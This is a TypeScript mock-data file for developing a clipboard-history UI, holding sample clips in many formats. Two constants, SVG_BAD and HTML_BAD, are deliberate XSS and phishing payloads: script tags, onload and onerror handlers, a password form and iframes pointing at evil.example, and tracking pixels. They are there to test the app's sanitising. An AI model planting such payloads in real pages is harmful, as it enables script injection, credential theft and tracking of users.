// Sample clips for building and checking the UI in a plain browser (development only: this file is never part of the built page).
// It includes hostile clips on purpose (script in an SVG, tracking in HTML, a secret) so the safety layers are exercised by eye as well as by tests.

import { PREVIEW_CHARS, type ClipContent, type ClipMeta } from './types';

export const MOCK_ACCOUNT = 'you@example.com';
const MINUTE = 60_000;

const CSV = 'Supplier,Invoice,Date,Amount (AUD)\nAcme Pty Ltd,INV-1042,2026-10-01,110.00\n"Bolt & Nut, Co",INV-77,2026-10-03,48.95\nTaumata Software,T-2210,2026-10-09,1320.00\nAnthropic,A-9981,2026-10-12,32.40';
const TSV = 'Item\tQty\tUnit\nBolt M8\t40\t0.35\nNut M8\t40\t0.12\nWasher M8\t80\t0.05';
const MD = '| Task | Owner | Due |\n|------|-------|-----|\n| Quote Carter | Dana | Fri |\n| BAS review | Michael | Mon |';
const JS = "async function loadInvoices(userId) {\n  const res = await fetch(`/api/invoices?user=${userId}`);\n  if (!res.ok) throw new Error('Could not load invoices');\n  return (await res.json()).filter((i) => i.status !== 'void');\n}";
const PY = 'def gst_inclusive(amount, rate=0.10):\n    """Return the GST-inclusive total."""\n    return round(amount * (1 + rate), 2)\n\nprint(gst_inclusive(100))';
const SQL = "SELECT c.name, SUM(i.total) AS billed\nFROM clients c\nJOIN fin_invoices i ON i.\"clientId\" = c.id\nWHERE i.date >= '2026-07-01'\nGROUP BY c.name\nORDER BY billed DESC;";
const JSON_TEXT = '{\n  "vendor": "Acme Pty Ltd",\n  "amount": 110,\n  "currency": "AUD",\n  "lines": [{ "sku": "M8", "qty": 40 }]\n}';
const PII = 'Contact: Jo Smith, jo.smith@example.com, 0412 345 678\nTFN 123 456 782\nBank: BSB 062-000 account 12345678\n12 Harbour Street, Sydney';
const LONG = 'Notes from the Carter Noir site visit.\n\nThe cellar door is 820 mm wide, which is under the 900 mm we assumed for the rack run. Dana will confirm with the cabinet maker whether a 600 mm deep unit still clears the swing arc.\n\nAction: re-run the layout with the narrower door and send the revised drawing package before Friday.';
const SVG_OK = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 80" width="240" height="160"><rect width="120" height="80" rx="10" fill="#cc785c"/><circle cx="40" cy="40" r="22" fill="#f5f5f0"/><path d="M70 55 L90 25 L110 55 Z" fill="#1a1a1a"/></svg>';
const SVG_BAD = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 80" width="240" height="160" onload="alert(\'svg onload\')"><script>alert("svg script")</script><rect width="120" height="80" fill="#3b82f6" onclick="alert(1)"/><foreignObject width="120" height="80"><iframe src="https://evil.example/steal"></iframe></foreignObject><image href="https://evil.example/pixel.png" width="1" height="1"/><text x="10" y="45" fill="#fff" font-size="14">Looks harmless</text></svg>';
const HTML_BAD = '<h2 onclick="alert(1)">Quarterly summary</h2><p>Revenue is <b>up 12%</b> on last quarter. <a href="https://evil.example/login">Sign in</a></p><script>alert("html script")</script><img src="https://evil.example/track.gif" onerror="alert(1)"><form action="https://evil.example"><input name="pw" type="password"><button>Confirm</button></form><iframe src="https://evil.example"></iframe><ul><li>Carter Noir</li><li>Taumata</li></ul>';

interface Seed { kind: ClipMeta['kind']; text?: string; sourceApp: string | null; masked?: boolean; seed?: number; width?: number; height?: number }

const HAND: Seed[] = [
  { kind: 'text', text: 'Call Dana back about the Carter quote before 3pm', sourceApp: 'Teams' },
  { kind: 'text', text: 'https://www.curam-ai.com.au/pricing?utm_source=newsletter', sourceApp: 'chrome.exe' },
  { kind: 'text', text: '#cc785c', sourceApp: 'Figma' },
  { kind: 'text', text: JS, sourceApp: 'Code.exe' },
  { kind: 'text', text: CSV, sourceApp: 'EXCEL.EXE' },
  { kind: 'image', sourceApp: 'SnippingTool.exe', seed: 1, width: 300, height: 190 },
  { kind: 'text', text: PII, sourceApp: 'OUTLOOK.EXE' },
  { kind: 'text', text: 'Authorization: Bearer ••••••••••••••••••••••••', sourceApp: 'Postman.exe', masked: true },
  { kind: 'svg', text: SVG_OK, sourceApp: 'Figma' },
  { kind: 'svg', text: SVG_BAD, sourceApp: 'chrome.exe' },
  { kind: 'html', text: HTML_BAD, sourceApp: 'chrome.exe' },
  { kind: 'text', text: PY, sourceApp: 'Code.exe' },
  { kind: 'text', text: TSV, sourceApp: 'EXCEL.EXE' },
  { kind: 'text', text: SQL, sourceApp: 'pgAdmin4.exe' },
  { kind: 'text', text: JSON_TEXT, sourceApp: 'Code.exe' },
  { kind: 'text', text: MD, sourceApp: 'Notion.exe' },
  { kind: 'image', sourceApp: 'chrome.exe', seed: 2, width: 300, height: 220 },
  { kind: 'text', text: LONG, sourceApp: 'WINWORD.EXE' },
];

function filler(i: number): Seed {
  const n = i + 1;
  switch (i % 5) {
    case 0: return { kind: 'text', text: `Reminder ${n}: send the revised drawing package for job ${1000 + n}.`, sourceApp: 'Teams' };
    case 1: return { kind: 'text', text: `https://example.com/jobs/${1000 + n}/files`, sourceApp: 'msedge.exe' };
    case 2: return { kind: 'text', text: `Ref,Qty\nR-${n},${n % 9 + 1}\nR-${n + 1},${(n + 3) % 9 + 1}`, sourceApp: 'EXCEL.EXE' };
    case 3: return { kind: 'text', text: `#${((n * 2654435) & 0xffffff).toString(16).padStart(6, '0')}`, sourceApp: 'Figma' };
    default: return { kind: 'text', text: `Meeting note ${n}: confirm site access and the delivery window with the builder.`, sourceApp: 'ONENOTE.EXE' };
  }
}

export interface MockClips { metas: ClipMeta[]; texts: Map<string, string>; images: Map<string, { seed: number; width: number; height: number }> }

/** `count` clips, newest first, spaced a few minutes apart. */
export function buildMockClips(count = 100, now = Date.now()): MockClips {
  const seeds = [...HAND];
  for (let i = 0; seeds.length < count; i++) seeds.push(filler(i));
  const metas: ClipMeta[] = [];
  const texts = new Map<string, string>();
  const images = new Map<string, { seed: number; width: number; height: number }>();
  seeds.slice(0, count).forEach((s, i) => {
    const id = `clip-${String(i + 1).padStart(3, '0')}`;
    const text = s.text ?? '';
    if (s.kind === 'image') images.set(id, { seed: s.seed ?? i, width: s.width ?? 300, height: s.height ?? 200 });
    else texts.set(id, text);
    metas.push({
      id, kind: s.kind, createdAt: now - i * 7 * MINUTE - (i === 0 ? 20_000 : 0), sourceApp: s.sourceApp,
      sizeBytes: s.kind === 'image' ? 48_000 + i * 311 : new Blob([text]).size,
      preview: s.kind === 'image' ? '' : text.slice(0, PREVIEW_CHARS), truncated: text.length > PREVIEW_CHARS, masked: !!s.masked,
      ...(s.kind === 'image' ? { width: s.width ?? 300, height: s.height ?? 200 } : {}),
    });
  });
  return { metas, texts, images };
}

/** A small picture drawn in the page (a stand-in for a screenshot), as a data: URL. */
export function mockImage(seed: number, width: number, height: number): string {
  const c = document.createElement('canvas');
  c.width = width; c.height = height;
  const g = c.getContext('2d');
  if (!g) return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
  const hue = (seed * 67) % 360;
  const grad = g.createLinearGradient(0, 0, width, height);
  grad.addColorStop(0, `hsl(${hue} 55% 62%)`); grad.addColorStop(1, `hsl(${(hue + 50) % 360} 60% 38%)`);
  g.fillStyle = grad; g.fillRect(0, 0, width, height);
  g.fillStyle = 'rgba(255,255,255,0.88)'; g.fillRect(24, 24, width - 48, 34);
  g.fillStyle = '#1a1a1a'; g.font = '600 16px "Segoe UI", sans-serif'; g.fillText(`Receipt #${1000 + seed}`, 34, 47);
  for (let r = 0; r < 4; r++) { g.fillStyle = 'rgba(255,255,255,0.7)'; g.fillRect(24, 76 + r * 26, (width - 48) * (0.55 + 0.1 * ((r + seed) % 4)), 12); }
  return c.toDataURL('image/png');
}

export function mockContent(m: MockClips, id: string): ClipContent | null {
  const meta = m.metas.find((c) => c.id === id);
  if (!meta) return null;
  if (meta.kind === 'image') {
    const im = m.images.get(id);
    return im ? { id, kind: 'image', mime: 'image/png', dataUrl: mockImage(im.seed, im.width, im.height), width: im.width, height: im.height } : null;
  }
  const text = m.texts.get(id);
  return text === undefined ? null : { id, kind: meta.kind, text };
}
